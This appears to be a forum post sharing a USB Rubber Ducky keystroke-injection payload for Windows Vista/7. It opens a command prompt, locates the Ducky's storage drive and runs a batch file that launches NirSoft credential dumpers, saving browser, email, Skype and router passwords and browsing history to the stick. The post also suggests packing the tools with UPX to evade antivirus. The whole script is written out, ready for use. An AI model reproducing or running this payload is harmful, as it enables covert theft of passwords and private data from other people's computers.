The following is a modified version of Mr Gray's password recovery script for the USB rubber ducky. Modifications include googleKnowsBest's ducky drive detection if the drive is labeled "DUCKY", which has been coded to work on all current windows OS's, and a modification to run from a folder on the ducky labeled "MrGraysRubberHacks". This payload has also been tweaked to be a little more forgiving to errors, and as such has some more delays. Forgiving as this script is, it may need customized delays depending on the users requirements. The payload is designed for c_duck_v2_S001.hex, and c_duck_v2_S002.hex firmware types. Wait for the ducky's drive to mount, and then press the button to launch this payload. This payload may also be launched using a tandem duck attack in which you use stock duck firmware, linked to a mass storage device via a 2 port USB cable splitter. This method would mount the mass storage almost instantaneously which would negate the need to wait for the ducky's mass storage to mount. 
The forum page is located here: 

http://forums.hak5.org/index.php?/topic/29067-payload-mr-grays-password-history-recovery-tool-for-rubber-ducky/

The executables are accessible at: 

http://www.mediafire.com/?nm1c62qt9w9z3wg

The executables are also individually downloadable from their original location at nirsoft. The executables become resistant to most antivirus detection using the packer UPX. Other such products would further obfuscate the signatures. 

```
ENCODE: 

DEFAULT_DELAY 25
REM File: MrGraysRubberHacks.txt
REM Target: WINDOWS VISTA/7
DELAY 1000
ESCAPE
CONTROL ESCAPE
DELAY 100
STRING cmd
DELAY 100
ENTER
DELAY 150
STRING for /f "tokens=3 delims= " %A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%A:)
ENTER
STRING set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks
ENTER
STRING %DUCKYdrive%\launch.bat
ENTER

LAUNCH.BAT file: 

for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)

REM Output everything to this folder so I don't have everything on the duck's root. 
set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks

start %DUCKYdrive%\WebBrowserPassView.exe /stext %DUCKYdrive%\WebBrowserPassView.txt
start %DUCKYdrive%\SkypeLogView.exe /stext %DUCKYdrive%\SkypeLogView.txt
start %DUCKYdrive%\RouterPassView.exe /stext %DUCKYdrive%\RouterPassView.txt
start %DUCKYdrive%\pspv.exe /stext %DUCKYdrive%\pspv.txt
start %DUCKYdrive%\PasswordFox.exe /stext %DUCKYdrive%\PasswordFox.txt
start %DUCKYdrive%\OperaPassView.exe /stext %DUCKYdrive%\OperaPassView.txt
start %DUCKYdrive%\mspass.exe /stext %DUCKYdrive%\mspass.txt
start %DUCKYdrive%\mailpv.exe /stext %DUCKYdrive%\mailpv.txt
start %DUCKYdrive%\iepv.exe /stext %DUCKYdrive%\iepv.txt
start %DUCKYdrive%\ChromePass.exe /stext %DUCKYdrive%\ChromePass.txt
start %DUCKYdrive%\ChromeHistoryView.exe /stext %DUCKYdrive%\ChromeHistoryView.txt
start %DUCKYdrive%\BulletsPassView.exe /stext %DUCKYdrive%\BulletsPassView.txt
start %DUCKYdrive%\BrowsingHistoryView.exe /stext %DUCKYdrive%\BrowsingHistoryView.txt
```

If you wish to remove the part of the script that contains the code to the folder MrGraysRubberHacks, and instead have all output go to the root of the drive delete the following items:

```
ENCODE: 

...
STRING set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks
ENTER
...
```

```
LAUNCH.BAT file: 

...
REM Output everything to this folder so I dont have everything on the duck's root. 
set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks
...
```
